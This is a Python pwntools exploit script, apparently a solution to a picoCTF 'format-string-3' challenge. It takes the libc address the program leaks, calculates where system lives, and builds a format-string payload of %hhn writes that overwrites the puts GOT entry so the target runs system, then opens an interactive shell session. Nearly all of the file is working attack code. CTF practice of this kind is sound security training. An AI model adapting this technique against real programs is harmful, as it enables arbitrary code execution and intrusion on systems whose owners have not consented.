import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *

context.arch='amd64'

fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
print(f'got_puts: {hex(got_puts)}')
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc_system: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc_setvbuf: {hex(libc_setvbuf)}')


r = process("./format-string-3")
# r = remote("rhea.picoctf.net", port=53952)
r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
res = r.recvline()
loaded_libc_setvbuf = int(res[:-1].decode(), base=16)
log.info(f'loaded_libc_setvbuf: {hex(loaded_libc_setvbuf)}')

loaded_libc_system = (loaded_libc_setvbuf - libc_setvbuf) + libc_system
log.info(f'loaded_libc_system: {hex(loaded_libc_system)}')

b0 = int(hex(loaded_libc_system & 0xff), base=16)
b1 = int(hex((loaded_libc_system & 0xff00) >> 8), base=16)
b2 = int(hex((loaded_libc_system & 0xff0000) >> 16), base=16)
b3 = int(hex((loaded_libc_system & 0xff000000) >> 16 >> 8), base=16)
b4 = int(hex((loaded_libc_system & 0xff00000000) >> 16 >> 16), base=16)
b5 = int(hex((loaded_libc_system & 0xff0000000000) >> 16 >> 16 >> 8), base=16)

print(hex(b0), hex(b1), hex(b2), hex(b3), hex(b4), hex(b5))

def gen_payload(pos=10):
    fsmt = ""
    cur_len = 0

    for i, b in enumerate([b0, b1, b2, b3, b4, b5]):
        db = b
        if db < cur_len:
            while db < cur_len:
                db += 256
        fsmt += f"%{db - cur_len}c%{pos + i}$hhn"
        cur_len += db - cur_len
        # print(hex(db), cur_len, fsmt)
    offset = "A" * (8 - len(fsmt) % 8)
    return fsmt + offset

dummy_len = len(gen_payload(10))
payload = gen_payload(38 + int(dummy_len / 8))
payload = payload.encode()

base_addr = 0x404018
for i in range(len([b0, b1, b2, b3, b4, b5])):
    payload += p64(base_addr + i)
log.info(f"payload:{payload}")

# payload

r.sendline(payload)
r.interactive()
